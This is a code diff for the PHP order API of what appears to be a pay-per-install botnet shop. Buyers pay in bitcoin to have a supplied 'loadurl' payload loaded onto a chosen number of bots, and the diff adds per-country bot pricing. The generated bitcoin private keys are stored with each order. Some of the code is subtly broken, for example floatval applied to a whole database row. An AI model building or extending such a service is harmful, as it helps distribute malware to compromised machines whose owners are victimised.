@@ -29,7 +29,10 @@ class OrderApi
 
     function __construct()
     {
-        $this->priceperbot = 0.20;
+        $price = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = ? ");
+        $price->execute(array("mix"));
+        $DefaultMixPrice = $price->fetch();
+        $this->priceperbot = floatval($DefaultMixPrice);
         $this->blockconfirms = 1;
         if($this->isTestnet){
             $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTCTEST/";
@@ -78,6 +81,35 @@ class OrderApi
         $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
         $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
         $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey));
+        return array(
+            "address" => $bitcoinAddress["address"],
+            "coinsToPay" => $coinsToPay,
+            "usd" => $usd,
+            "userAuthkey" => $userAuthkey,
+        );
+    }
+
+    private function generateOrderMix($type, $bots,$loadurl,$apikey,$mix)
+    {
+        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+
+        $usd = 0;
+        $sql = "SELECT * FROM botshop_pricelist";
+        $mixArray = explode(",",$mix);
+        $botsDifference = number_format($bots / count($mixArray),0);
+        foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
+            foreach ($mixArray as $selected){
+                if($listItem["iso_short"] == $selected){
+                    $usd +=  $botsDifference * $listItem["price_usd"];
+                }
+            }
+        }
+
+        //$usd = $this->botsToUSD($bots);
+        $userAuthkey = md5($this->generateRandomString(30));
+        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api,word_mix) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?,?)");
+        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey,$mix));
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
@@ -215,8 +247,13 @@ class OrderApi
 
     public function createoder(){
         $this->checkApi();
-        $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
-        echo json_encode($infos);
+        if(!empty($_POST["load_counties"])){
+            $infos = $this->generateOrderMix("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"],$_POST["load_counties"]);
+            echo json_encode($infos);
+        }else{
+            $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
+            echo json_encode($infos);
+        }
         die();
     }
 
